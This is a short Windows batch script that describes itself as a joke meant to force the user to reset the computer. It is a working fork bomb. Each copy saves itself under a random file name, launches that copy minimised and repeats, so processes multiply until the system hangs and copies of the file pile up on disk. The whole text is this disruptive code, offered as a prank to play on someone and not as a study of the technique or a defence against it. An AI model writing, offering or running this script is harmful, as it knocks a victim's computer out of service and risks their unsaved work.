REM A joke which forces the user to reset his computer

@echo off
Title Wanna be fucked up well?
set counter=2
:top
set FN=%random%%random%%random%
copy /Y "%~f0" "%FN%.bat"
start /MIN %FN%.bat
set /a counter=%counter%-1
if %counter% LEQ 0 goto :end
goto :top
pause
:end
exit